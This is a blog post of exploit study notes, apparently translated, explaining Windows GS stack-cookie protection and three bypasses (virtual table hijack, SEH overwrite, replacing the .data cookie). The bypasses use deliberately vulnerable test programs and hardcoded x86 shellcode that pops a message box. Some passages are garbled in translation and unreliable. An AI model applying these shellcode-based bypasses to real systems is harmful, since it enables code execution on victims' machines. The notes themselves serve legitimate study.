---
title: Exploit learning notes 012 GS security compilation
Description: The principle and breakthrough of GS secure compilation
date: 2020-11-11 16:45:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-012-gs-security-compilation/)

## GS Secure Compilation Protection Principle

### Introduction

- After Vistual Studio 2003 (VS 7.0), this compilation option is enabled by default
- Location: `Project -> project Properties -> Configuration Properties -> C/C++ -> Code Generaion -> Buffer Security Check`
- GS presses an additional random DWORD into the stack frame when all function calls occur, this random number is called `canary`, this random number is `Security Cookie`
- `Security Cookie` is located before EBP, the system will also store a copy of `Security Cookie` in the `.data` memory area
- When an overflow occurs in the stack, `Security Cookie` will be flooded first, followed by the EBP and the return address
- Before the function returns, the system will perform an additional security verification operation called `Security Check`.
- In the security check, the system will compare the value of `Security Cookie` originally stored in the stack frame with the value in the copy of `.data`, if the two do not match, it means that `Security Cookie` has been destroyed and the stack has overflowed
- When an overflow is detected, the system will enter the exception handling process, the function will not return normally, and the ret instruction will not be executed.
- The cost of extra operations and data is a drop in system performance, so GS will not be applied in the following cases.
  - the function does not contain a buffer
  - the function is defined to have a variable argument list
  - the function uses unprotected keyword tags
  - the function contains embedded assembly code in the first statement
  - the buffer is not of type 8 bytes and is not larger than 4 bytes
- Due to these exceptions, there are still problems, SoEasy VS2005 SP1 introduced a new security marker: `#pragma strict_gs_check`, which can heap any function to add a security cookie to ensure security
- Variable reordering.
  - According to the type of local variables heap variables in the stack frame to adjust the position of the string moved to the high address of the stack frame to prevent the string overflow when the destruction of other local variables
  - Also assigns pointer and string parameters to low addresses in memory

### `Security Cookie` details

- The first double word of the `.data` section is used as the seed of the cookie, or raw cookie (all functions' Cooike are generated with this DWORD)
- Cookie seed is different for each run
- After the initialization of the stack frame, the system uses the ESP iso or seed as the cookie of the current function as a difference between different functions to increase the randomness of the cookie
- The seed of the cookie is restored by ESP before the function returns

### The problem of `Security Cookie

- Attacks based on rewriting function pointers are difficult to defend
- Attacks against exception handling mechanism are difficult to defend against GS
- GS is a protection for stack frames, hard to defend against heap overflow attacks

## Use unprotected memory to break GS

> Test environment.
>
> - Visual Studio 2008 Professional
> - Windows XP SP3

### Test code

```CPP
#include <string.h>
#include <tchar.h>

int vulfuction(char* str)
{
    char arry[4];
    strcpy(arry, str);
    return 1;
}

int _tmain(int argc, _TCHAR* argv[])
{
    char* str = "yeah, the function is without GS";
    vulfuction(str);
    return 0;
}
```

> In theory, valfunction does not contain more than 4 bytes of buffer, so the stack space of this function should be unprotected, but the actual test is protected, this problem is to be solved

## Break GS with dummy function

> Only the function checks the stack when it returns, so the process can be hijacked before the function returns

### Code

```cpp
#include"string.h"

class GSVirtual {
public:
	void gsv(char * src)
	{
		char buf[200];
		strcpy(buf, src);
		vir();
	}

	virtual void vir(){}
};

int main()
{
	GSVirtual test;

	test.gsv(
		"\x72\x7A\x81\x7C" //address of "pop pop ret" 
		"\x1A\x20\x90\x90\x90\x90\x90\x90\xFC\x68\x6A\x0A\x38\x1E\x68\x63"
    	"\x89\xD1\x4F\x68\x32\x74\x91\x0C\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7"
		"\x04\x2B\xE3\x66\xBB\x33\x32\x53\x68\x75\x73\x65\x72\x54\x33\xD2"
		"\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B\x09\x8B\x69\x08\xAD"
		"\x3D\x6A\x0A\x38\x1E\x75\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C"
		"\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34"
		"\xBB\x03\xF5\x99\x0F\xBE\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0"
		"\x46\xEB\xF1\x3B\x54\x24\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B"
		"\x3C\x7B\x8B\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D"
		"\x6A\x0A\x38\x1E\x75\xA9\x33\xDB\x53\x68\x6B\x61\x6F\x6F\x68\x4D"
		"\x69\x73\x61\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90" 
		);

	return 0;
}
```

### Description

- Note: The test environment is `Windows XP SP3`, the compiled version is `Release` version, the compiler is `Visual Studio 2008`, and the compilation option is `Disable compilation optimization/0d`.
- The first four bytes of shellcode are the address of the following assembly code, if the system is not `Windows XP SP3`, you need to modify

```x86asm
pop edi
pop esi
retn
```

- Override the C++ virtual table pointer to make it point to the springboard, and if you need to balance the stack, look for an instruction in the system dynamic link library as a springboard to jump into the shellcode.
- If the return address is a garbage instruction, make it not affect the execution of shellcode as much as possible, here `0x817C` is a `cmp` instruction, then this assembly instruction try to make it not occur data access exception
- This shellcode will pop up a window

## Using SEH to break GS

> GS does not protect SEH, so you can overwrite SEH to achieve hijacking

### Code

```cpp
#include<stdafx.h>
#include<string.h>

char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"......"
"\x90\x90\x90\x90"
"\xA0\xFE\x12\x00"//address of shellcode;

void test(char * input)
{
  char buf[200];
  strcpy(buf,input);
  strcat(buf,input);
}

void main()
{
  test(shellcode);
}
```

### Description

> There is a stack overflow vulnerability in the function test, the variable input will be overwritten after strcpy, and strcat will get an illegal address, the function ah will go to the SEH processing process, we can hijack the system process before `security_cookie` check

- Note: The test environment is `Windows 2000 SP4`, the compiled version is `Release` version, the compiler is `Visual Studio 2005`, and the compilation option is `Disable compilation optimization/0d`.
- The reason for using `Windows 2000` is to prevent the effect of `SafeSEH`.
- To be completed: Page:277

## Positive hard GS (replaces the original cookie in .data)

### Code

```cpp
#include<string.h>
#include<stdlib.h>

char Shellcode[] =
"\x90\x90\x90\x90"//new value of cookie in .data 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xF4\x6F\x82\x90" // result of \x90\x90\x90\x90 xor EBP 
"\x90\x90\x90\x90" // Nop Code
"\x94\xFE\x12\x00" // address of Shellcode 
;

void test(char * s, int i, char * src)
{
	char dest[200];

	if(i < 0x9995)
	{
		char* buf = s + i;
		*buf = *src;
		*(buf + 1) = *(src + 1);
		*(buf + 2) = *(src + 2);
		*(buf + 3) = *(src + 3);
		strcpy(dest, src);
	}
}

void main()
{
	char* str = (char *)malloc(0x10000);
	test(str, 0xFFFF2FB8, Shellcode);
}
```

### Description

- Note: The test environment is `Windows XP SP3`, the compilation version is `Release` version, the compiler is `Visual Studio 2008`, and the compilation option is `Disable compilation optimization/0d`
- When i is negative, it is possible to point to the `.data` section
- The test function has a typical stack overflow vulnerability
- Purpose: change the first four bytes of .data (the original cookie) to our fixed value while changing security_cookie(ebp-0x4) in the stack overflow

### Details

> Calculate security_cookie at the beginning of the function

```x86asm
00401009 |.  A1 00304000 mov eax,dword ptr ds:[__security_cookiedt> ; get the original cookie from the first four bytes of the 0x403000(.data) section
0040100E |.  33C5 xor eax,ebp ; use this value and eax to heterodynamically operate
00401010 |.  8945 FC mov [local.1],eax ; put this value at ebp-0x4
```

> verify security_cookie when function will return

```x86asm
...
004010CA |> \8B4D FC mov ecx,[local.1] ; take out the value of ebp-0x4 and put it in ecx
004010CD |.  33CD xor ecx,ebp ; put the value of ebp and ecx in the same operation
004010CF |.  E8 3D000000 call TestCons.__security_check_cookieionF> ; call __security_check function to verify the cookie
...

TestCons.__security_check:
00401111 > $ 3B0D 00304000 cmp ecx,dword ptr ds:[__security_cookiedt> ; Compare ecx with the first four bytes of 0x403000(.data)
00401117 .  75 02 jnz short TestCons.0040111B ; if different then jump to exception handling process
00401119 .  f3:c3 rep retn ; return
0040111B > E9 AC020000 jmp TestCons.__report_gsfailureokienFilte> ; Exception handling process function
...
```
